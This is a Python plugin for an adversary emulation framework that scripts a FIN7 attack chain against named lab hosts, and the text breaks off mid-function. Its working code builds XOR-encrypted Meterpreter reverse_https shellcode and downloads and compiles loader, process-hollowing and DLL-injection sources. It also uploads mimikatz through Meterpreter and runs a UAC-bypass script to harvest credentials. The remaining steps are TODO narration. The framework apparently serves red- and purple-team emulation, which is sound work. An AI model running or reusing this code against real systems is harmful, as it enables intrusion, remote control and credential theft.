#!/usr/bin/env python3

# Adversary emulation for FIN7

from plugins.base.attack import AttackPlugin
from app.interface_sfx import CommandlineColors
from app.metasploit import MSFVenom, MetasploitInstant
import os
import time


class FIN7Plugin(AttackPlugin):

    # Boilerplate
    name = "fin7_1"
    description = "A plugin simulating the FIN7 adversary"
    ttp = "multiple"
    references = ["https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Emulation_Plan/Scenario_1"]

    required_files_attacker = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share

    ######
    payload_type_1 = "windows/x64/meterpreter/reverse_https"  # payload for initial stage

    def __init__(self):
        super().__init__()
        self.plugin_path = __file__
        self.metasploit_1 = None

    def get_metasploit_1(self):
        """ Returns a metasploit with a session for the first targeted machine """
        if self.metasploit_1:
            return self.metasploit_1

        self.metasploit_1 = MetasploitInstant(self.metasploit_password, attack_logger=self.attack_logger, attacker=self.attacker_machine_plugin, username=self.metasploit_user)
        self.metasploit_1.start_exploit_stub_for_external_payload(payload=self.payload_type_1)
        self.metasploit_1.wait_for_session()
        return self.metasploit_1

    def step1(self):
        self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Step 1 (target hotelmanager): Initial Breach{CommandlineColors.ENDC}", 1)

        self.attack_logger.start_narration(
            "Step 1 (target hotelmanager): Initial Breach\n----------------------------")
        self.attack_logger.start_narration("""
NOT IMPLEMENTED YET

* RTF with VB payload (needs user interaction)
* playoad executed by mshta
* mshta build js payload
* mshta copies wscript.exe to ADB156.exe
* winword.exe spawns verclsid.exe (a normal tool that can download stuff, no idea yet what it is used for here)
* mshta uses taskschd.dll to create a task in 5 minutes

This is the initial attack step that requires user interaction. Maybe it is better to reproduce those steps separately. They seem to be quite standard for any Ransomware infection.

""")
        # TODOS: No idea if we can replicate that automated as those are manual tasks

        # RTF with VB payload (needs user interaction)
        # playoad executed by mshta
        # mshta build js payload
        # mshta copies wscript.exe to ADB156.exe
        # winword.exe spawns verclsid.exe (a normal tool that can download stuff, no idea yet what it is used for here)
        # mshta uses taskschd.dll to create a task in 5 minutes

        self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}End Step 1: Initial Breach{CommandlineColors.ENDC}", 1)

    def step2(self):
        self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Step 2 (target hotelmanager): Delayed Malware Execution{CommandlineColors.ENDC}", 1)
        self.attack_logger.start_narration(
            "Step 2 (target hotelmanager): Delayed Malware Execution\n----------------------------")
        self.attack_logger.start_narration("""
NOT IMPLEMENTED YET

* scheduled task spawns Adb156.exe via svchost https://attack.mitre.org/techniques/T1053/005/
* Adb156.exe loads scrobj.dll and executes sql-rat.js via jscript https://attack.mitre.org/techniques/T1059/007/
* Adb156.exe connects via MSSQL to attacker server
* WMI quieries for network information and system information https://attack.mitre.org/techniques/T1016/ and https://attack.mitre.org/techniques/T1082/ (Caldera ?)

In this simulation sql-rat.js communication will be replaced by Caldera communication.

""")

        # scheduled task spawns Adb156.exe via svchost https://attack.mitre.org/techniques/T1053/005/
        # Adb156.exe loads scrobj.dll and executes sql-rat.js via jscript https://attack.mitre.org/techniques/T1059/007/
        # Adb156.exe connects via MSSQL to attacker server
        # WMI quieries for network information and system information https://attack.mitre.org/techniques/T1016/ and https://attack.mitre.org/techniques/T1082/ (Caldera ?)

        self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}End Step 2: Delayed Malware Execution{CommandlineColors.ENDC}", 1)

    def step3(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 3 (target hotelmanager): Target Assessment{CommandlineColors.ENDC}", 1)
        self.attack_logger.start_narration("Step 3 (target hotelmanager): Target Assessment\n----------------------------")

        # TODO: Make sure logging is nice and complete

        hotelmanager = self.get_target_by_name("hotelmanager")

        # WMI queries  https://attack.mitre.org/techniques/T1057/

        # Execute net view from spawned cmd https://attack.mitre.org/techniques/T1135/
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}new view {CommandlineColors.ENDC}", 1)
        self.caldera_attack(hotelmanager,
                            "deeac480-5c2a-42b5-90bb-41675ee53c7e",
                            parameters={"remote.host.fqdn": hotelmanager.get_ip()},
                            tactics="Discovery",
                            tactics_id="TA0007",
                            situation_description="The attackers got a bastion system infected and start to evaluate the value of the network")

        # check for sandbox https://attack.mitre.org/techniques/T1497/
        # The documentation does not define how it is checking exactly.
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}get-wmiobject win32_computersystem | fl model{CommandlineColors.ENDC}", 1)
        self.caldera_attack(hotelmanager,
                            "5dc841fd-28ad-40e2-b10e-fb007fe09e81",
                            tactics="Defense Evasion",
                            tactics_id="TA0005",
                            situation_description="There are many more ways to identify if the attacker is running in a VM. This is just one.")

        # query username https://attack.mitre.org/techniques/T1033/
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}query USERNAME env{CommandlineColors.ENDC}", 1)
        self.caldera_attack(hotelmanager,
                            "c0da588f-79f0-4263-8998-7496b1a40596",
                            tactics="Discovery",
                            tactics_id="TA0007"
                            )

        # TODO: query computername https://attack.mitre.org/techniques/T1082/
        # self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}query COMPUTERNAME env{CommandlineColors.ENDC}", 1)
        # self.caldera_attack(hotelmanager, "c0da588f-79f0-4263-8998-7496b1a40596")

        # TODO: load adsldp.dll and call dllGetClassObject() for the Windows Script Host ADSystemInfo Object COM object https://attack.mitre.org/techniques/T1082/
        # WMI query for System Network Configuration discovery https://attack.mitre.org/techniques/T1016/
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Network configuration discovery. Original is some WMI, here we are using nbstat{CommandlineColors.ENDC}", 1)
        self.caldera_attack(hotelmanager,
                            "14a21534-350f-4d83-9dd7-3c56b93a0c17",
                            tactics="Discovery",
                            tactics_id="TA0007")
        # System Info discovery https://attack.mitre.org/techniques/T1082/
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}System info discovery, as close as it gets{CommandlineColors.ENDC}",
            1)
        self.caldera_attack(hotelmanager,
                            "b6b105b9-41dc-490b-bc5c-80d699b82ce8",
                            tactics="Discovery",
                            tactics_id="TA0007")
        # CMD.exe->powershell.exe, start takeScreenshot.ps1 https://attack.mitre.org/techniques/T1113/
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Take screenshot{CommandlineColors.ENDC}",
            1)
        self.caldera_attack(hotelmanager,
                            "316251ed-6a28-4013-812b-ddf5b5b007f8",
                            tactics="Collection",
                            tactics_id="TA0009"
                            )
        # TODO: Upload that via MSSQL transaction https://attack.mitre.org/techniques/T1041/

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 3: Target Assessment{CommandlineColors.ENDC}", 1)

    def build_step4(self):
        """ Builds tools for step 4"""

        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 4 compiling tools{CommandlineColors.ENDC}", 1)

        self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_4")

        hotelmanager = self.get_target_by_name("hotelmanager")

        # Several steps are required https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step4/babymetal
        # Original: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 EXITFUNC=thread -f C --encrypt xor --encrypt-key m
        # EXITFUNC=thread     : defines cleanup after exploitation. Here only the thread is exited
        # -f C                : output is c code
        # --encrypt xor       : xor encrypt the results
        # --encrypt-key m     : the encryption key

        # Generate shellcode
        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 EXITFUNC=thread -f C --encrypt xor --encrypt-key m


        dl_uri = "https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step4/babymetal/babymetal.cpp"
        architecture = "x64"
        target_platform = "windows"
        payload = self.payload_type_1
        lhost = self.attacker_machine_plugin.get_ip()
        lport = "443"
        filename = "babymetal.dll"
        encoding = "base64"
        encoded_filename = "babymetal_encoded.txt"
        sRDI_conversion = True
        for_step = 4

        logid = self.attack_logger.start_build(dl_uri=dl_uri,
                                               architecture=architecture,
                                               target_platform=target_platform,
                                               payload=payload,
                                               lhost=lhost,
                                               lport=lport,
                                               filename=filename,
                                               encoding=encoding,
                                               encoded_filename=encoded_filename,
                                               sRDI_conversion=sRDI_conversion,
                                               for_step=for_step,
                                               comment="This is the stager uploaded to the target and executed to get the first Meterpreter shell on the target network.")

        venom = MSFVenom(self.attacker_machine_plugin, hotelmanager, self.attack_logger)
        venom.generate_payload(payload=payload,
                               architecture=architecture,
                               platform=target_platform,
                               lhost=lhost,
                               lport=lport,
                               exitfunc="thread",
                               format="c",
                               encrypt="xor",
                               encrypt_key="m",
                               outfile="step_4_shellcode.c")

        self.attacker_machine_plugin.remote_run("mv step_4_shellcode.c tool_factory/step_4/shellcode.c")

        # get C source
        self.attacker_machine_plugin.remote_run(
            f"cd tool_factory/step_4; rm babymetal.cpp; wget {dl_uri}")

        # paste shellcode into C source
        self.attacker_machine_plugin.remote_run(
            "cd tool_factory; python3 insert_shellcode.py --original_file step_4/babymetal.cpp --shellcode_file step_4/shellcode.c --out_file step_4/babymetal_patched.cpp")

        # Compile to DLL
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_4; sed -i 's/#include <Windows.h>/#include <windows.h>/g' babymetal_patched.cpp")
        self.attacker_machine_plugin.remote_run(
            f"cd tool_factory/step_4;x86_64-w64-mingw32-g++ -shared babymetal_patched.cpp -o {filename}")

        # sRDI conversion
        self.attacker_machine_plugin.remote_run(f"cd tool_factory/; python3 sRDI/Python/ConvertToShellcode.py -f BabyMetal step_4/{filename}")

        # base64 conversion
        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_4; base64 babymetal.bin > {encoded_filename}")

        self.attack_logger.stop_build(logid = logid)

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}Step 4 compiling tools{CommandlineColors.ENDC}", 1)

    def step4(self):
        """ Create staging payload and inject it into powsershell.exe
        https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step4/babymetal

        """
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 4 (target hotelmanager): Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)
        self.attack_logger.start_narration(
            "Step 4 (target hotelmanager): Staging Interactive Toolkit\n----------------------------")
        self.attack_logger.start_narration("""
In the original attack Babymetal payload is a dll. Currently we are using a simplification here (directly calling a exe). The original steps are:
* Target already runs adb156.exe. This one gets the shellcode over the network connection and decodes it.
* adb156.exe executes cmd.exe which executes powershell.exe. It decodes embedded dll payload https://attack.mitre.org/techniques/T1059/003/ and https://attack.mitre.org/techniques/T1059/001/
* Powershell cmdlet Invoke-Expression executes decoded dll https://attack.mitre.org/techniques/T1140/
* The script invoke-Shellcode.ps1 loads shellcode into powershell.exe memory (Allocate memory, copy shellcode, start thread)  (received from C2 server) https://attack.mitre.org/techniques/T1573/
""")
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Create babymetal replacement{CommandlineColors.ENDC}",
            1)
        # Uploaded stager creates meterpreter shell (babymetal)
        # Generate payload:

        hotelmanager = self.get_target_by_name("hotelmanager")
        self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_4")
        payload_name = "babymetal.exe"

        # TODO: Babymetal payload is a dll. Currently we are using a simplification here (exe). Implement the proper steps.

        venom = MSFVenom(self.attacker_machine_plugin, hotelmanager, self.attack_logger)
        venom.generate_and_deploy(payload=self.payload_type_1,
                                  architecture="x64",
                                  platform="windows",
                                  lhost=self.attacker_machine_plugin.get_ip(),
                                  format="exe",
                                  outfile=payload_name)

        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute babymetal replacement - waiting for meterpreter shell{CommandlineColors.ENDC}", 1)

        # TODO: target already runs adb156.exe. This one gets the shellcode and decodes it.
        # TODO: adb156.exe -> cmd.exe ->powershell.exe decodes embedded dll payload https://attack.mitre.org/techniques/T1059/003/ and https://attack.mitre.org/techniques/T1059/001/

        # TODO: powershell cmdlet Invoke-Expression executes decoded dll https://attack.mitre.org/techniques/T1140/
        # TODO: invoke-Shellcode.ps1 loads shellcode into powershell.exe memory (Allocate memory, copy shellcode, start thread)  (received from C2 server) https://attack.mitre.org/techniques/T1573/
        # https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin7/Resources/Step4/babymetal/Invoke-Shellcode.ps1

        # metasploit1 = self.get_metasploit_1()
        # print("Got session, calling command")
        # print(metasploit.meterpreter_execute_on(["getuid"], hotelmanager))

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 4: Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)

    def step5(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 5 (target hotelmanager): Escalate Privileges{CommandlineColors.ENDC}", 1)
        self.attack_logger.start_narration(
            "Step 5 (target hotelmanager): Escalate Privileges\n----------------------------")

        hotelmanager = self.get_target_by_name("hotelmanager")

        # This is meterpreter !
        metasploit = self.get_metasploit_1()

        # powershell -> CreateToolHelp32Snapshot() for process discovery (Caldera alternative ?) https://attack.mitre.org/techniques/T1057/
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute ps -ax through meterpreter{CommandlineColors.ENDC}", 1)
        print(metasploit.ps_process_discovery(hotelmanager,
                                              situation_description="The processes found here are not directly used (terminated, infected, ...). This is just a basic discovery step.",
                                              countermeasures="None possible. This is a very standard behaviour. Could be interesting after some data on process behaviour got aggregated as additional info snippet.")
              )

        # powershell: GetIpNetTable() does ARP entries https://attack.mitre.org/techniques/T1016/
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Execute arp through meterpreter{CommandlineColors.ENDC}", 1)
        # print(metasploit.meterpreter_execute_on(["arp"], hotelmanager))
        print(metasploit.arp_network_discovery(hotelmanager,
                                               situation_description="Ready for first network enumeration",
                                               countermeasure="Maybe detect direct arp access. Should be uncommon for normal tools."))

        # powershell: nslookup to query domain controler(hoteldc) for ip from ARP (Caldera ?) https://attack.mitre.org/techniques/T1018/
        # TODO: Add a new machine in config as <itadmin> ip. Re-activate. This command caused trouble afterwards (uploading mimikatz). Maybe it is because of an error
        itadmin = self.get_target_by_name("itadmin")
        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute nslookup through meterpreter{CommandlineColors.ENDC}", 1)
        # cmd = f"execute -f nslookup.exe -H -i -a '{itadmin}'"
        # print(metasploit.meterpreter_execute_on([cmd], hotelmanager))
        print(metasploit.nslookup(hotelmanager, itadmin,
                                  situation_description="Looking up info on the next target, the machine itadmin"))

        # Copy step 5 attack tools to attacker

        use_mimikatz = True   # TODO: Read this from config
        if use_mimikatz:
            # powershell download from C2 server: samcat.exe (mimikatz) https://attack.mitre.org/techniques/T1507/
            # tplayground = hotelmanager.get_playground()
            # aplayground = self.attacker_machine_plugin.get_playground() or ""
            self.attacker_machine_plugin.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step5", "samcat.exe"), "samcat.exe")
            self.attacker_machine_plugin.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step5", "uac-samcats.ps1"), "uac-samcats.ps1")
            print(metasploit.meterpreter_execute_on(["ls"], hotelmanager, delay=10))

            # cmd = "upload boring_test_file.txt 'samcat.exe'  "

            self.attack_logger.vprint(
                f"{CommandlineColors.OKCYAN}Uploading mimikatz through meterpreter{CommandlineColors.ENDC}", 1)
            # cmd = "upload samcat.exe 'samcat.exe'  "
            # print(cmd)
            # print(metasploit.meterpreter_execute_on([cmd], hotelmanager, delay=10))
            print(metasploit.upload(hotelmanager, "samcat.exe", "samcat.exe",
                                    situation_description="Uploading Mimikatz",
                                    countermeasure="File detection"))

            # cmd = "upload uac-samcats.ps1 'uac-samcats.ps1'  "
            # cmd = "upload boring_test_file.txt 'samcat.exe'  "
            # print(cmd)
            self.attack_logger.vprint(
                f"{CommandlineColors.OKCYAN}Uploading UAC bypass script through meterpreter{CommandlineColors.ENDC}", 1)
            # print(metasploit.meterpreter_execute_on([cmd], hotelmanager, delay=10))
            print(metasploit.upload(hotelmanager, "uac-samcats.ps1", "uac-samcats.ps1",
                                    delay=10,
                                    situation_description="Uploading UAC bypass powershell script. This one will execute Mimikatz",
                                    countermeasure="File detection"))

            # execute uac-samcats.ps1 This: spawns a powershell from powershell -> samcat.exe as high integrity process https://attack.mitre.org/techniques/T1548/002/
            execute_samcats = "execute -f powershell.exe -H -i -a '-c ./uac-samcats.ps1'"
            print(execute_samcats)
            self.attack_logger.vprint(
                f"{CommandlineColors.OKCYAN}Execute UAC bypass (and mimikatz) through meterpreter{CommandlineColors.ENDC}", 1)
            logid = self.attack_logger.start_metasploit_attack(source=self.attacker_machine_plugin.get_ip(),
                                                               target=hotelmanager.get_ip(),
                                                               metasploit_command=execute_samcats,
                                                               ttp="T1003",
                                                               name="execute_mimikatz",
                                                               description="Execute Mimikatz to access OS credentials",
                                                               tactics="Credential Access",
                                                               tactics_id="TA0006",
                                                               situation_description="Executing Mimikatz through UAC bypassing powershell",
                                                               countermeasure="Behaviour detection"
                                                               )
            print(metasploit.meterpreter_execute_on([execute_samcats], hotelmanager, delay=20))
            self.attack_logger.stop_metasploit_attack(source=self.attacker_machine_plugin.get_ip(),
                                                      target=hotelmanager.get_ip(),
                                                      metasploit_command=execute_samcats,
                                                      ttp="T1003",
                                                      logid=logid)

        # samcat.exe: reads local credentials https://attack.mitre.org/techniques/T1003/001/

        print("Verify we are still connected")
        print(metasploit.meterpreter_execute_on(["ps -ax"], hotelmanager))
        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 5: Escalate Privileges{CommandlineColors.ENDC}", 1)

    def build_step6(self):
        """ Builds tools for step 6 """

        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 6 compiling tools{CommandlineColors.ENDC}", 1)

        self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_6")

        hotelmanager = self.get_target_by_name("hotelmanager")

        # Several steps are required https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step4/babymetal
        # Original: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 EXITFUNC=thread -f C --encrypt xor --encrypt-key m
        # EXITFUNC=thread     : defines cleanup after exploitation. Here only the thread is exited
        # -f C                : output is c code
        # --encrypt xor       : xor encrypt the results
        # --encrypt-key m     : the encryption key

        dl_uri = "https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step6/Hollow/ProcessHollowing.c"
        payload = self.payload_type_1
        architecture = "x64"
        target_platform = "windows"
        lhost = self.attacker_machine_plugin.get_ip()
        lport = "443"
        filename = "hollow.exe"
        for_step = 6

        logid = self.attack_logger.start_build(dl_uri=dl_uri,
                                               architecture=architecture,
                                               target_platform=target_platform,
                                               payload=payload,
                                               lhost=lhost,
                                               lport=lport,
                                               filename=filename,
                                               for_step=for_step,
                                               comment="This will be copied using paexec to the it admin host. It will spawn svchost.exe there and create a first Meterpreter shell on this PC.")

        # Generate shellcode
        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 -f exe -o msf.exe
        venom = MSFVenom(self.attacker_machine_plugin, hotelmanager, self.attack_logger)
        venom.generate_payload(payload=payload,
                               architecture=architecture,
                               platform=target_platform,
                               lhost=lhost,
                               lport=lport,
                               format="exe",
                               outfile="msf.executable")

        self.attacker_machine_plugin.remote_run("mv msf.executable tool_factory/step_6/msf.executable")

        # xxd   xxd -i msf.exe
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_6/; xxd -i msf.executable > MSFPayload.h")

        # Get ProcessHollowing.c
        self.attacker_machine_plugin.remote_run(
            f"cd tool_factory/step_6; rm ProcessHollowing.c; wget {dl_uri}")
        self.attacker_machine_plugin.remote_run(
            "cd tool_factory/step_6; sed -i 's/#include <Windows.h>/#include <windows.h>/g' ProcessHollowing.c")

        # TODO: Patch header
        # self.attacker_machine_plugin.remote_run(
        #    "cd tool_factory; python3 insert_shellcode.py --original_file step_6/ProcessHollowing.c --shellcode_file step_6/msfpayload --out_file step_6/processhollowing_patched.cpp")

        # Fix unicode
        # LPSTR tgt_process = "C:\\Windows\\system32\\svchost.exe";
        # TEXT(tgt_process)
        self.attacker_machine_plugin.remote_run(r"cd tool_factory/step_6; sed -i 's/TEXT(tgt_process)/TEXT(\"C:\\\\Windows\\\\system32\\\\svchost.exe\")/g' ProcessHollowing.c")

        # Compiled for 64 bit.
        self.attacker_machine_plugin.remote_run("cd tool_factory/step_6; rm hollow.exe;")
        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_6; x86_64-w64-mingw32-gcc -municode -D UNICODE -D _UNICODE ProcessHollowing.c -L/usr/x86_64-w64-mingw32/lib/ -l:libntdll.a -o {filename}")

        self.attack_logger.stop_build(logid=logid)

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}Step 6 compiling tools{CommandlineColors.ENDC}", 1)

    def step6(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 6 (target hotelmanager -> itadmin): Expand Access{CommandlineColors.ENDC}", 1)
        self.attack_logger.start_narration(
            "Step 6 (target hotelmanager and itadmin): Expand Access\n----------------------------")
        self.attack_logger.start_narration("""
NOT IMPLEMENTED YET. NEEDS A SECOND MACHINE FOR LATERAL MOVEMENT
* powershell download: paexec.exe and hollow.exe https://attack.mitre.org/techniques/T1105/
* spawn powershell through cmd
* We move to the itadmin host: Use password with paexec to move lateral to it admin host https://attack.mitre.org/techniques/T1021/002/
* paexec  starts temporary windows service and executes hollow.exe https://attack.mitre.org/techniques/T1021/002/
* https://www.poweradmin.com/paexec/
* => Lateral move to itadmin
* hollow.exe spawns svchost and unmaps memory image https://attack.mitre.org/techniques/T1055/012/
* svchost starts data exchange
        """)
        # This is meterpreter !

        # powershell download: paexec.exe and hollow.exe https://attack.mitre.org/techniques/T1105/
        # spawn powershell through cmd
        # !!! admin host!!! use password with paexec to move lateral to it admin host https://attack.mitre.org/techniques/T1021/002/
        # paexec  starts temporary windows service and executes hollow.exe https://attack.mitre.org/techniques/T1021/002/
        # https://www.poweradmin.com/paexec/
        # => Lateral move to itadmin
        # hollow.exe spawns svchost and unmaps memory image https://attack.mitre.org/techniques/T1055/012/
        # svchost starts data exchange

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 6: Expand Access{CommandlineColors.ENDC}", 1)

    def build_step7(self):
        """ Builds tools for step 7 """

        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 7 compiling tools{CommandlineColors.ENDC}", 1)

        # https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step7/BOOSTWRITE-src

        # TODO: Create VS Studio DLl project

        # TODO msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 -f dll -o msf.dll

        # TODO install curl and zlib dev
        # libcurl4-gnutls-dev, libcurlpp-dev (c++), libz-mingw-w64-dev,
        # But the libraries are also in https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step7/BOOSTWRITE-src/curl

        # TODO  SRDI to create PIC code
        # python3 ../sRDI/Python/ConvertToShellcode.py  msf.dll

        # TODO Create C array of sRDI DLL   xxd -i msf.exe
        # mv msf.bin shellcode
        # xxd -i shellcode

        # TODO add own payload to msfpayload.h

        # TODO dllmain.cpp: patch attacker ip into it

        # TODO Build

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}Step 7 compiling tools{CommandlineColors.ENDC}", 1)

    def step7(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 7 on itadmin: Setup User Monitoring{CommandlineColors.ENDC}", 1)
        self.attack_logger.start_narration(
            "Step 7 (target itadmin): Setup User Monitoring\n----------------------------")
        self.attack_logger.start_narration("""
NOT IMPLEMENTED YET. A REPLACEMENT FOR THE ALOHA COMMAND CENTER IS NEEDED

* Start situation: Step 6 executed a meterpreter in hollow.exe We can fake that to be able to start with step 7 directly
* BOOSTWRITE does DLL Hijack within a propriteary piece of software (Aloha Command Center)
* This is meterpreter !
* Emulating DLL hijacking functionality of BOOSTWRITE
* Create BOOSTWRITE meterpreter handler
* Create temporary HTTP server serving "B" as XOR Key
* hollow.exe meterpreter session dowloads BOOSTWRITE.dll to srrstr.dll https://attack.mitre.org/techniques/T1105/
* cmd.exe spawns svchost.exe -> executes SystemPropertiesAdvanced.exe which executes srrstr.dll
* srrstr.dll spawns rundll32.exe which communicates to metasploit. New shell !
""")

        # Start situation: Step 6 executed a meterpreter in hollow.exe We can fake that to be able to start with step 7 directly
        # BOOSTWRITE does DLL Hijack within a propriteary piece of software (Aloha Command Center)

        # This is meterpreter !
        # Emulating DLL hijacking functionality of BOOSTWRITE

        # Create BOOSTWRITE meterpreter handler
        # Create temporary HTTP server serving "B" as XOR Key
        # hollow.exe meterpreter session dowloads BOOSTWRITE.dll to srrstr.dll https://attack.mitre.org/techniques/T1105/
        # cmd.exe spawns svchost.exe -> executes SystemPropertiesAdvanced.exe which executes srrstr.dll
        # srrstr.dll spawns rundll32.exe which communicates to metasploit. New shell !

        # => Adversary gets a new shell

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 7: Setup User Monitoring{CommandlineColors.ENDC}", 1)

    def step8(self):
        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 8 (target: itadmin as domain_admin): User Monitoring{CommandlineColors.ENDC}", 1)
        self.attack_logger.start_narration(
            "Step 8 (target itadmin): User Monitoring\n----------------------------")
        self.attack_logger.start_narration("""
NOT IMPLEMENTED YET. MAYBE DO THIS PARTIAL. KEYLOGGING NEEDS USER INTERACTION.
(Screen spying and keylogging are already implemented as standalone metasploit attacks. Use them)

* Meterpreter migrates to explorer.exe (from svchost) https://attack.mitre.org/techniques/T1055/
* screenspy for screen capture https://attack.mitre.org/techniques/T1113/
* migrate session to mstsc.exe https://attack.mitre.org/techniques/T1056/001/
* deploy keylogger https://attack.mitre.org/techniques/T1056/001/
* create a RDP session from itadmin -> accounting using stolen credentials
""")

        # This is meterpreter !

        # Meterpreter migrates to explorer.exe (from svchost) https://attack.mitre.org/techniques/T1055/
        # screenspy for screen capture https://attack.mitre.org/techniques/T1113/
        # migrate session to mstsc.exe https://attack.mitre.org/techniques/T1056/001/
        # deploy keylogger https://attack.mitre.org/techniques/T1056/001/
        # create a RDP session from itadmin -> accounting using stolen credentials

        # TODO: Screen spying and keylogging are already implemented as standalone metasploit attacks. Use them

        self.attack_logger.vprint(
            f"{CommandlineColors.OKGREEN}End Step 8: User Monitoring{CommandlineColors.ENDC}", 1)

    def build_step9(self):
        """ Builds tools for step 9 """

        self.attack_logger.vprint(
            f"{CommandlineColors.OKBLUE}Step 9 compiling tools{CommandlineColors.ENDC}", 1)

        accounting = self.get_target_by_name("accounting")
        self.attacker_machine_plugin.remote_run("mkdir tool_factory/step_9")

        payload = "windows/meterpreter/reverse_https"
        filename = "dll329.dll"
        for_step = 9
        architecture = "x86"
        target_platform = "windows"
        lhost = self.attacker_machine_plugin.get_ip()
        lport = "53"
        sRDI_conversion = True
        encoded_filename = "bin329.tmp"

        logid = self.attack_logger.start_build(architecture=architecture,
                                               target_platform=target_platform,
                                               payload=payload,
                                               lhost=lhost,
                                               lport=lport,
                                               filename=filename,
                                               for_step=for_step,
                                               sRDI_conversion= sRDI_conversion,
                                               encoded_filename=encoded_filename,
                                               comment="And SRDI converted Meterpreter shell. Will be stored in the registry.")

        # msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=53 -f dll -o payload.dll
        venom = MSFVenom(self.attacker_machine_plugin, accounting, self.attack_logger)
        venom.generate_payload(payload=payload,
                               architecture=architecture,
                               platform=target_platform,
                               lhost=lhost,
                               lport=lport,
                               format="dll",
                               outfile="payload.dll")

        # python3 sRDI/Python/ConvertToShellcode.py payload.dll
        self.attacker_machine_plugin.remote_run("mv payload.dll tool_factory/step_9")
        self.attacker_machine_plugin.remote_run("cd tool_factory/; python3 sRDI/Python/ConvertToShellcode.py step_9/payload.dll")

        # mv payload.bin bin329.tmp
        self.attacker_machine_plugin.remote_run(f"cp tool_factory/step_9/payload.bin tool_factory/step_9/{encoded_filename}")
        # This will be stored in the registry
        self.attack_logger.stop_build(logid=logid)

        # ## DLL 329
        # Build https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step9/InjectDLL-Shim

        dl_uris = ["https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step9/InjectDLL-Shim/dllmain.cpp",
                   "https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step9/InjectDLL-Shim/pe.cpp",
                   "https://raw.githubusercontent.com/center-for-threat-informed-defense/adversary_emulation_library/master/fin7/Resources/Step9/InjectDLL-Shim/pe.h"]
        filename = "dll329.dll"
        for_step = 9
        logid = self.attack_logger.start_build(dl_uris=dl_uris,
                                               filename=filename,
                                               for_step=for_step,
                                               comment="Will be injected into the AccoutingIQ executable.")

        self.attacker_machine_plugin.remote_run(
            "cd tool_factory/step_9; rm dllmain.cpp")
        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_9; wget {dl_uris[0]}")

        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; rm pe.cpp;")
        self.attacker_machine_plugin.remote_run(f"cd tool_factory/step_9; wget {dl_uris[1]}")

        self.attacker_machine_plugin.remote_run("cd tool_factory/step_9; rm pe.h;")
